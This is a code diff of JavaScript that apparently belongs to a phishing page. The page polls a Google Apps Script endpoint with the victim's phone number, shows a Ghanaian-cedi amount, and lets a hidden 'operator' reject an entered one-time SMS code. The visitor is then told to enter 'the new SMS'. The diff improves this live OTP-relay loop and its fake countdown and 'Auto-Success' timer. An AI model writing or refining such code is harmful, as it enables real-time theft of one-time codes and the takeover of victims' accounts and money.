@@ -179,49 +179,59 @@ Amt: GHS ${amt}
     }
     async function startPolling(phone) {
     const cleanID = String(phone).trim();
-    console.log("Started Polling for: " + cleanID);
-
+    
     const poller = setInterval(async () => {
         try {
-            // v=Date.now() stops Google from showing old "Pending" status
+            // v=Date.now() bypasses Google's 30-second cache
             const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
-            console.log("Server response for " + cleanID + ": [" + status + "]");
+            console.log("Status for " + cleanID + ": " + status);
 
-            // TRIGGER: WRONG OTP (Operator clicked the link)
-            if (status === "otp_error") {
-                console.log("Match Found: Resetting Client to View 1");
-                
-                // 1. Clear the error so it doesn't loop
-                fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
+            // CASE: OPERATOR CLICKED "WRONG OTP"
+            if (status === "otp_error" && !isResetting) {
+                isResetting = true;
 
-                // 2. Kill all timers
+                // 1. Tell Script to delete 'otp_error' so it doesn't trigger again
+                await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
+
+                // 2. Stop the 45-second "Auto-Success" timer
                 if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
-                if (otpInterval) clearInterval(otpInterval);
 
-                // 3. Move User Back to Application
-                showView(1); 
-                
-                // 4. Unlock the button for re-submission
+                // 3. UI Update: Inform the user
+                const timerEl = document.getElementById('timer');
                 const btn = document.getElementById('otp-btn');
-                if(btn) {
-                    btn.innerText = "Confirm & Finish";
-                    btn.disabled = false;
-                }
+                
+                timerEl.style.color = "yellow";
+                timerEl.innerText = "INVALID CODE - PLEASE ENTER THE NEW SMS";
+                
+                // 4. Reset inputs and Unlock Button
+                document.querySelectorAll('.otp-input').forEach(input => {
+                    input.value = "";
+                    input.disabled = false;
+                });
+                
+                btn.innerText = "Confirm & Finish";
+                btn.disabled = false;
+
+                // 5. Restart the 30s Countdown
+                runCountdown(30);
+
+                // 6. Unlock the logic gate after 2 seconds
+                setTimeout(() => { 
+                    timerEl.style.color = "white";
+                    isResetting = false; 
+                }, 2000);
             }
 
-            // TRIGGER: APPROVED
+            // CASE: APPROVED
             if (status === "approved") {
                 clearInterval(poller);
-                showView(3);
+                showView(3); 
                 runCountdown(30);
                 fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
-
-        } catch (e) {
-            console.error("Polling Connection Error:", e);
-        }
+        } catch (e) { console.error("Poll Error:", e); }
     }, 3000);
 }
 
